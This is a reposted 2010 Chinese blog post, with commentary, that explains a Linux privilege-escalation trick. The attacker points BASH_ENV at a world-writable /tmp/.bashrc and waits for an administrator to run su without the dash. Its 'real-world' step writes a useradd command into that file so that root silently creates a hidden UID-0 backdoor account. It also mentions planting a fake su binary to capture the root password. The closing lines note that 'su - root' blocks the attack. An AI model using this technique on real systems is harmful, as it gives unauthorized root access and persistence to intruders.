title: linux下$BASH_ENV变量的利用
categories: [Linux,Shell编程]
tags: []
date: 2010-08-13 20:25:00
---
转载一编提权文章做解释：<br /><p>一个linux提权用的技巧，放出来攒RP了。<br />OK，通常情况下，我们在执行bash脚本的时候，有一个执行过程，其中有一点比较重要:如果BASH_ENV被设置的话，它就会执行BASH_ENV指向的脚本<br />一个test:<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />[xiaoyu@localdomain ~]$ export BASH_ENV=&quot;/tmp/.bashrc&quot;<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />/tmp/.bashrc<br />[xiaoyu@localdomain ~]$ cat /tmp/.bashrc<br />#!/bin/bash<br />echo &quot;Hello&quot;<br />[xiaoyu@localdomain ~]$ ls -l<br />-rwxrwxr-x 1 xiaoyu xiaoyu 22 2008-09-11 05:54 test.sh</p><p>[xiaoyu@localdomain ~]$ cat test.sh<br />#!/bin/bash<br />echo &quot;kk&quot;<br />[xiaoyu@localdomain ~]$ ./test.sh<br />Hello<br />kk</p><p>恩，很好，和我们预期的一样。看看我们怎么利用。</p><p>grep su ~/.bash_history<br />显示此用户有使用su登录root账户的特殊癖好。以前我们遇到这种情况通常就是塞个fakesu.c进去。然后修改.bash_profile，建立个别 名之类的东西。通过getpass来获得root密码，记录，然后去除别名.....关键是管理员使用正确密码登录的时候也是会提示一次密码错误。遇到傻 点的管理员可能就放过这个细节了，再输入一遍密码就OK了。但是某些非人类admin会以最快的速度检查系统被入侵的迹象，外加啥啥啥，而且这种管理员改  root密码几乎是肯定的了。所以偷取下来的密码也没啥用处。恩，聪明的X客们一定知道我要做什么了。呵呵，先看看环境变量su后在不<br />以下是引用片段：<br />[xiaoyu@localdomain ~]$ echo $BASH_ENV<br />/tmp/.bashrc<br />[xiaoyu@localdomain ~]$ su<br />Password:<br />[root@localdomain xiaoyu]# echo $BASH_ENV<br />/tmp/.bashrc</p><p>OK，实验结束，实战：<br />以下是引用片段：<br />[xiaoyu@localdomain tmp]$ echo ’/usr/sbin/useradd -u 0 -o kk 2&gt; /dev/null’ &gt; /tmp/.bashrc<br />[xiaoyu@localdomain tmp]$ cat /tmp/.bashrc<br />/usr/sbin/useradd -u 0 -o kk 2&gt; /dev/null<br />[xiaoyu@localdomain tmp]$ grep kk /etc/passwd<br />[xiaoyu@localdomain tmp]$ echo $BASH_ENV<br />/tmp/.bashrc<br />[xiaoyu@localdomain tmp]$ su<br />Password:<br />[root@localdomain tmp]# cd /home/xiaoyu</p><br /><br />解释。<br />.bash_profile 文件内容<br /><br /># .bash_profile<br /><br /># Get the aliases and functions<br />if [ -f ~/.bashrc ]; then<br />. ~/.bashrc<br />fi<br /><br /># User specific environment and startup programs<br /><br />PATH=$PATH:$HOME/bin<br /><br />export PATH<br />unset USERNAME<br /><br />----------------------------------------------------------------------------------------------------------------------------------<br />----------------------------------------------------------------------------------------------------------------------------------<br />.bashrc文件<br /># .bashrc<br /><br /># User specific aliases and functions<br /><br />alias rm='rm -i'<br />alias cp='cp -i'<br />alias mv='mv -i'<br /><br /># Source global definitions<br />if [ -f /etc/bashrc ]; then<br />. /etc/bashrc<br />fi<br /><br />----------------------------------------------------------------------------------------------------------------------------------<br />----------------------------------------------------------------------------------------------------------------------------------<br />每当执行bash脚本，就会调用。默认是=&gt;bash_profile。它在调用别的脚本。<br /><br />$BASH_ENV变量定义后，直接掉过常规。<br />/tmp目录默认谁都可以写的，谁都可以调用。在httpd提权时，可以上传文件到这，可惜没有拿下。<br /><br />export定义环境变量，启动一个shell后会改变。<br /><br />只用su进去之后，环境变量没有改变。所以调用BASH时，创建用户。<br /><br />$:su - root&#160; //可以预防，改变环境变量到root。 <br /><br /><br /><br /><br />